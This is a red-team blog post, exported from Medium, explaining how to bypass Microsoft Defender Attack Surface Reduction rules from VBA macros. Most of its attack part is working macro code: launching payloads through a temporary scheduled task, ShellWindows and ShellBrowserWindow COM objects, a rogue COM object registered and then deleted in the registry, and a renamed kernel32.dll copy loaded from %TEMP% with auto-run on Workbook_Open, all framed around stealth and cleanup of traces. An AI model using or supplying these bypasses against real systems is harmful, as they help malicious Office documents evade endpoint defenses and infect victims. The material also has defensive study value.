---
layout: post
title: "Bypassing Attack Surface Reduction (ASR) Rules with VBA Macros"
date: 2025-08-26
categories: [Red Team,Macro,Malware Analysis,Malware Development,Blue Team,VBA,Cyber Security]
image: https://cdn-images-1.medium.com/max/800/1*15gFAZAWtcufSSqBVCBpCg.jpeg
---

In our last two articles, we covered the fundamentals of VBA, command execution using macros, Powershell Droppers and how it can be abused. Now we are gonna go more advanced.

#### What is ASR?

“Attack surface reduction is a feature that helps prevent actions and apps that are typically used by exploit-seeking malware to infect machines.”


#### What is great about ASR?

Most victims of cyberattacks, including in APT campaigns, are targeted by social engineering or a combination of technical vulnerability and social engineering. Example:

. Malicious Office document

- Rogue USB device
- Drive by download
- Malicious APK in store, etc.

Office documents and scripts are also often used in advanced attack scenarios to bypass security mechanisms. My opinion is that with ASR, Microsoft attempts to shut down a whole category of phishing exploits. For example, the rule “Block all Office applications from creating child processes” probably blocks 99.9% of macro-based droppers found in the wild. The malicious Office VBA malware described in the Botconf 2018 talk “Stagecraft of Malicious Office Documents — A Look at Recent Campaigns” could all be disarmed by this single rule.

Such security policy could change the future of information security (imagine no more malicious VBA, no more droppers, no more malicious USB key…)

The problem is that currently ASR rules are easy to bypass, and often rules are too limited or even broken.

**Configure ASR**

Basically, ASR is a policy consisting in a set of rules which can be set to:

- 0 — Disabled (default)
- 1 — Enabled
- 2 — Audit

The techniques is inspired by the methods described in [Sévagas’ ASR bypass research.](https://blog.sevagas.com/IMG/pdf/bypass_windows_defender_attack_surface_reduction.pdf)

#### Disclaimer:

This article is for educational purposes only. The techniques discussed are intended for understanding security controls and enhancing defensive strategies.

* * *

#### Block all Office applications from creating child processes

“**Office apps will not be allowed to create child processes. This includes Word, Excel, PowerPoint, OneNote, and Access. This is a typical malware behavior, especially for macro-based attacks that attempt to use Office apps to launch or download malicious executables.**”

Trigger rule

This rule is very effective, it prevents running and program or command line from an Office application, it is effective against all kind of attacks such as macro or DDE.

So how to bypass? Well the answer is in the name of the rule. “Block all Office applications from creating child processes”. Let’s assume the rule is not buggy and does not have flaws. Instead of bypassing it, we can just go around!

We just have to execute processes in a way they are not an office application child! And there are plenty of methods to do that, at least from inside a macro.

Test with Wscript.Shell The next code snippet is a classic way to execute a payload in VBA or VBScript.

> Sub Exec(targetPath as String)

> CreateObject(“WScript.Shell”).Run targetPath, 0

> End Sub

This code is obviously blocked by the ASR rule. Same as using VBA “Shell”, “ShellExecute” functions, using DDE attacks or using Excel COM object.

* * *

#### Task Scheduler

This is the first method I came with when I heard about ASR. I thought, well, if my application is not allowed to start a process, let’s just use the task scheduler for that!

```
Sub SchedulerExec(targetPath As String)
    Dim service As Object
    Dim rootFolder As Object
    Dim taskDefinition As Object
    Dim Action As Object
    ' Create Task Scheduler COM Object
    Set service = CreateObject("Schedule.Service")
    service.Connect
    ' Get Root Folder (where tasks are stored)
    Set rootFolder = service.GetFolder("\")
    
    ' Create a new task definition
    Set taskDefinition = service.NewTask(0)
    ' Define the action (execute a program)
    Set Action = taskDefinition.Actions.Create(0) ' ActionTypeExec = 0
    Action.Path = targetPath
    Action.Arguments = ""
    Action.HideAppWindow = True
    ' Register the task with 'Create and Run' options (value 6)
    Call rootFolder.RegisterTaskDefinition("System Timer T", taskDefinition, 6, , , 3)
    ' Wait 1 second before deleting the task
    Application.Wait (Now + TimeValue("0:00:01"))
    ' Delete the task to clean up
    Call rootFolder.DeleteTask("System Timer T", 0)
End Sub
```

#### Function Purpose

It:

- **Creates a temporary scheduled task** using the `Schedule.Service` COM object.
- **Executes the desired payload/program** (e.g., an `.exe` or script).
- **Deletes the task after execution**, leaving minimal forensic artifacts.

#### Code Explanation

```
Dim service As Object
Dim rootFolder As Object
Dim taskDefinition As Object
Dim Action As Object
```

Declares objects to interact with **Windows Task Scheduler** via COM:

- `service`: The main Task Scheduler service.
- `rootFolder`: Points to the root folder where tasks are stored.
- `taskDefinition`: Blueprint/template for the task.
- `Action`: Describes what the task will do (e.g., run a program).

```
Set service = CreateObject("Schedule.Service")
service.Connect
```

Creates and connects to the **Task Scheduler COM interface**.

```
Set rootFolder = service.GetFolder("\")
```

Gets the **root task folder** (typically where user-defined tasks go).

```
Set taskDefinition = service.NewTask(0)
```

Creates a **blank task definition** (like a task template).

```
Set Action = taskDefinition.Actions.Create(0) ' 0 = Exec action
Action.Path = targetPath
Action.Arguments = ""
Action.HideAppWindow = True
```

- Defines a task **action** of type `Exec` (which runs an executable).
- `Action.Path = targetPath`: Path to the program you want to run (e.g., `"calc.exe"` or `"C:\Tools\payload.exe"`).
- `HideAppWindow = True`: Runs **invisibly**, with no GUI window shown (stealthy).

```
Call rootFolder.RegisterTaskDefinition("System Timer T", taskDefinition, 6, , , 3)
```

This **registers and runs** the task:

- `"System Timer T"` = the task name.
- `6` = `TASK_CREATE_OR_UPDATE + TASK_RUN` → Creates and runs immediately.
- `, , 3` = `TASK_LOGON_INTERACTIVE_TOKEN` → Runs under the current user context.

This combo **executes the payload silently**, without showing a task scheduler window or triggering ASR rules.

```
Application.Wait (Now + TimeValue("0:00:01"))
```

Waits **1 second** for the task to launch before cleaning up.

```
Call rootFolder.DeleteTask("System Timer T", 0)
```

Deletes the task — **leaves no persistent trace** of the payload being executed.

This method allows to execute any commands with all ASR rules enabled.

* * *

#### COM objects

In order to bypass ASR a COM object must:

- Have an interesting method such as CreateObject or ShellExecute which allow to execute a command.
- Be loaded via another executable (LocalServer32 registry key must be set set). COM object loaded via DLL (InProcServer32 is set) will generate a subprocess in the Office application which loads the DLL, so they will be blocked by ASR.

ShellWindows has both properties. “**Represents a collection of the open windows that belong to the Shell. Methods associated with this objects can control and execute commands within the Shell, and obtain other Shell-related objects**.”

#### `ShellWindowsExec` (Using `ShellWindows` CLSID)

- **Uses** `GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")`  
  → This CLSID corresponds to `ShellWindows`, which **manages open Explorer windows**.
- Calls `.Item().Document.Application.ShellExecute` to **execute the command**.
- Since `explorer.exe` is the parent process, it **bypasses ASR**.

```
Sub ShellWindowsExec(targetPath As String)
    Dim targetArguments As Variant
    Dim targetFile As String
    Dim ShellWindows As Object
    Dim itemObj As Object
    ' Extract filename and arguments
    targetFile = Split(targetPath, " ")(0)
    targetArguments = GetArguments(targetPath)
    ' Get ShellWindows object
    Set ShellWindows = GetObject("new:9BA05972-F6A8-11CF-A442-00A0C90A8F39")
    Set itemObj = ShellWindows.Item()
    ' Execute command
    itemObj.Document.Application.ShellExecute targetFile, targetArguments, "", "open", 1
End Sub
```

#### `ShellBrowserWindowExec` (Using `ShellBrowserWindow` CLSID)

- **Uses** `GetObject("new:c08afd90-f2a1-11d1-8455-00a0c91f3880")`  
  → This CLSID corresponds to `ShellBrowserWindow`, which **controls individual Explorer windows**.
- Executes a command through `.Document.Application.ShellExecute`.
- **Same ASR bypass as** `ShellWindowsExec`.

```
Sub ShellBrowserWindowExec(targetPath As String)
    Dim targetArguments As Variant
    Dim targetFile As String
    Dim shellBrowserWindow As Object
    ' Extract filename and arguments
    targetFile = Split(targetPath, " ")(0)
    targetArguments = GetArguments(targetPath)
    ' Get ShellBrowserWindow object
    Set shellBrowserWindow = GetObject("new:c08afd90-f2a1-11d1-8455-00a0c91f3880")
    ' Execute command
    shellBrowserWindow.Document.Application.ShellExecute targetFile, targetArguments, "", "open", 1
End Sub
```

* * *

#### Custom COM object (Registry Hijacking)

Since we have access to the registry, we can simply just create a new rogue COM object with LocalServer32 set and call it.

This technique **creates a rogue COM object in the Windows Registry** with a specified `LocalServer32` value that points to an executable or script. When the COM object is invoked using `GetObject()`, the target application **executes stealthily**.

#### How It Works

1 **Registers a Fake COM Object**

- Creates **a new CLSID** (`C7B167EA-DB3E-4659-BBDC-D1CCC00EFE9C`) in the registry under:
- `HKEY_CURRENT_USER\Software\Classes\CLSID\{CLSID}`
- Sets the `LocalServer32` value to **point to the target executable**.

2\. **Executes the Registered COM Object**

- Calls `GetObject("new:{CLSID}")`, which triggers execution.

3\. **Deletes the Registry Keys**

- **Removes traces of execution** after the payload is launched.

```
Sub ComObjectExec(targetPath As String)
    Dim wsh As Object
    Dim regKeyClass As String, regKeyLocalServer As String
    Dim clsid As String
    ' Create a WScript Shell object
    Set wsh = CreateObject("WScript.Shell")
    ' Define CLSID (Fake COM Object)
    clsid = "{C7B167EA-DB3E-4659-BBDC-D1CCC00EFE9C}"
    
    ' Define Registry Paths
    regKeyClass = "HKEY_CURRENT_USER\Software\Classes\CLSID\" & clsid & "\"
    regKeyLocalServer = "HKEY_CURRENT_USER\Software\Classes\CLSID\" & clsid & "\LocalServer32\"
    ' Create Registry Keys
    wsh.RegWrite regKeyClass, "FakeCOMObject", "REG_SZ"
    wsh.RegWrite regKeyLocalServer, targetPath, "REG_EXPAND_SZ"
    ' Execute via COM Object
    GetObject("new:" & clsid)
    ' Remove Registry Keys (Cleanup)
    wsh.RegDelete regKeyLocalServer
    wsh.RegDelete regKeyClass
End Sub
```

* * *

### Block Win32 API calls from Office macro

“**Malware can use macro code in Office files to import and load Win32 DLLs, which can then be used to make API calls to allow further infection throughout the system. This rule attempts to block Office files that contain macro code that is capable of importing Win32 DLLs.**” docs.microsoft.com

### ASR Rule Bypass via DLL Copy and API Call

#### Goal:

Bypass ASR rules that prevent Office applications (e.g., Word, Excel) from calling **Win32 APIs** or executing certain **malicious behaviors** (like code injection or suspicious child processes).

#### Technique Breakdown

```
Private Declare PtrSafe Sub Sleep Lib "k32.dll" (ByVal dwMilliseconds As Long)
```

- This declares the Sleep function from a DLL named k32.dll.
- `PtrSafe` is for 64-bit Office compatibility.
- Normally you’d write `Lib "kernel32.dll"` — but you’re using a **renamed copy** to evade ASR detection.

```
Sub Workbook_Open()
```

- Auto-executes when the Office document is opened (via macro auto-run).

```
WscriptExec ("cmd.exe /C copy /b C:\windows\system32\kernel32.dll " & Environ("TEMP") & "\k32.dll")
```

- Copies `kernel32.dll` to `%TEMP%\k32.dll`.
- Uses `/b` to copy as binary.
- This is the **bypass trick**: you’re still using `kernel32.dll`, but with a different **name and path**, so ASR doesn’t recognize it.

```
CreateObject("WScript.Shell").CurrentDirectory = Environ("TEMP")
```

- Changes the **current working directory** to `%TEMP%`, where your renamed `k32.dll` now resides.

```
Sleep 2000
```

- Calls the `Sleep` function (waits 2 seconds).
- The `k32.dll` is loaded instead of the standard `kernel32.dll`, and the function executes **without triggering ASR rules**.

```
WscriptExec "notepad.exe"
```

- Executes Notepad via a helper subroutine (defined below).

```
Sub WscriptExec(targetPath As String)
    CreateObject("WScript.Shell").Run targetPath, 1
End Sub
```

- A simple helper function to run a process using `WScript.Shell`.

**Why It Works**

ASR rules like:

- **Block Win32 API calls from Office macros**
- **Block Office from spawning child processes**

often rely on:

- **DLL names**
- **Hardcoded paths**
- **Heuristics based on known bad behaviors**

Since we are Renaming the DLL, Changing its path, Avoiding direct references to `kernel32.dll,`Running from `%TEMP%`

the behavior **evades static or signature-based checks**.

#### Resources:

By [Moataz Osama](https://medium.com/@mezo512) on [April 26, 2025](https://medium.com/p/ff64c2b57117).

[Canonical link](https://medium.com/@mezo512/bypassing-attack-surface-reduction-asr-rules-with-vba-macros-ff64c2b57117)

Exported from [Medium](https://medium.com) on August 26, 2025.